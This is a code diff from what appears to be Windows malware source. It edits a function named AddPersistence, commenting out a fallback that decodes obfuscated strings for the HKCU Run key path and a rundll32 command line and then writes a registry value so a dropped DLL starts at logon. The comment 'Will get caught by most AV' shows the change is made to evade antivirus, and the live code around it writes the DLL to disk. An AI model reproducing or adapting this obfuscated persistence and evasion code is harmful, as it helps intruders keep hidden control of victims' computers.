@@ -205,57 +205,57 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 			retVal = false;
 		}			
 
-		//If we were unable to create a SYSTEM level key
-		if( !retVal ){
-			//Try to open registry key (Software\\Microsoft\\Windows\\CurrentVersion\\Run)
-			char *keyPath = decode_split("\x5\x3\x6\xf\x6\x6\x7\x4\x7\x7\x6\x1\x7\x2\x6\x5\x5\xc\x5\xc\x4\xd\x6\x9\x6\x3\x7\x2\x6\xf\x7\x3\x6\xf\x6\x6\x7\x4\x5\xc\x5\xc\x5\x7\x6\x9\x6\xe\x6\x4\x6\xf\x7\x7\x7\x3\x5\xc\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x5\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe\x5\xc\x5\xc\x5\x2\x7\x5\x6\xe",98);
-			std::string reg_key_path(keyPath);
-			free(keyPath);
+		//If we were unable to create a SYSTEM level key - Current User Run Key - Will get caught by most AV
+	//	if( !retVal ){
+	//		//Try to open registry key (Software\\Microsoft\\Windows\\CurrentVersion\\Run)
+	//		char *keyPath = decode_split("\x5\x3\x6\xf\x6\x6\x7\x4\x7\x7\x6\x1\x7\x2\x6\x5\x5\xc\x5\xc\x4\xd\x6\x9\x6\x3\x7\x2\x6\xf\x7\x3\x6\xf\x6\x6\x7\x4\x5\xc\x5\xc\x5\x7\x6\x9\x6\xe\x6\x4\x6\xf\x7\x7\x7\x3\x5\xc\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x5\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe\x5\xc\x5\xc\x5\x2\x7\x5\x6\xe",98);
+	//		std::string reg_key_path(keyPath);
+	//		free(keyPath);
 
-			//Construct run key value
-			//"rundll32 "
-			char *rundll32 = decode_split("\x7\x2\x7\x5\x6\xe\x6\x4\x6\xc\x6\xc\x3\x3\x3\x2\x2\x0",18);
-			std::string run_dll_str(rundll32);
-			free(rundll32);
+	//		//Construct run key value
+	//		//"rundll32 "
+	//		char *rundll32 = decode_split("\x7\x2\x7\x5\x6\xe\x6\x4\x6\xc\x6\xc\x3\x3\x3\x2\x2\x0",18);
+	//		std::string run_dll_str(rundll32);
+	//		free(rundll32);
 
-			//Get the file path if admin
-			std::string file_path = GetDllFilePath( file_name_str, false );
+	//		//Get the file path if admin
+	//		std::string file_path = GetDllFilePath( file_name_str, false );
 
-			//Add DLL path
-			run_dll_str.append(file_path.c_str());
+	//		//Add DLL path
+	//		run_dll_str.append(file_path.c_str());
 
-			//",RegisterDll
-			char *regdll = decode_split("\x2\xc\x5\x2\x6\x5\x6\x7\x6\x9\x7\x3\x7\x4\x6\x5\x7\x2\x4\x4\x6\xc\x6\xc",24);
-			run_dll_str.append(regdll);
-			free(regdll);
+	//		//",RegisterDll
+	//		char *regdll = decode_split("\x2\xc\x5\x2\x6\x5\x6\x7\x6\x9\x7\x3\x7\x4\x6\x5\x7\x2\x4\x4\x6\xc\x6\xc",24);
+	//		run_dll_str.append(regdll);
+	//		free(regdll);
 
-						
-			//Check if reg key has been set for persistence
-			HKEY hkey = NULL;
-			long ret = RegOpenKeyExA(HKEY_CURRENT_USER, reg_key_path.c_str(), 0, KEY_ALL_ACCESS, &hkey);
-			if(ret == ERROR_SUCCESS ) {
+	//					
+	//		//Check if reg key has been set for persistence
+	//		HKEY hkey = NULL;
+	//		long ret = RegOpenKeyExA(HKEY_CURRENT_USER, reg_key_path.c_str(), 0, KEY_ALL_ACCESS, &hkey);
+	//		if(ret == ERROR_SUCCESS ) {
 
-				ret = RegSetValueEx (hkey, persist_ptr->reg_key_path.c_str(), 0, REG_SZ, (LPBYTE)run_dll_str.c_str(), (DWORD)run_dll_str.length());
-				if ( ret != ERROR_SUCCESS) {
-	#ifdef _DBG
-					Log( "[-] Error: Unable to write registry value.\n");
-	#endif
-				}
+	//			ret = RegSetValueEx (hkey, persist_ptr->reg_key_path.c_str(), 0, REG_SZ, (LPBYTE)run_dll_str.c_str(), (DWORD)run_dll_str.length());
+	//			if ( ret != ERROR_SUCCESS) {
+	//#ifdef _DBG
+	//				Log( "[-] Error: Unable to write registry value.\n");
+	//#endif
+	//			}
 
-				RegCloseKey(hkey);	
-				retVal = true;				
+	//			RegCloseKey(hkey);	
+	//			retVal = true;				
 
-				//Set to system32 path
-				persist_ptr->dll_file_path.assign(file_path);
+	//			//Set to system32 path
+	//			persist_ptr->dll_file_path.assign(file_path);
 
-			} else {
-	#ifdef _DBG
-				Log( "[-] Error: Unable to open persistence registry key in HKCU hive.\n");
-	#endif				
-			}	
+	//		} else {
+	//#ifdef _DBG
+	//			Log( "[-] Error: Unable to open persistence registry key in HKCU hive.\n");
+	//#endif				
+	//		}	
 
-		}
-		
+	//	}
+	//	
 		//Only write back to disk if the reg key is in place
 		if( retVal ){			
 			//Write the DLL
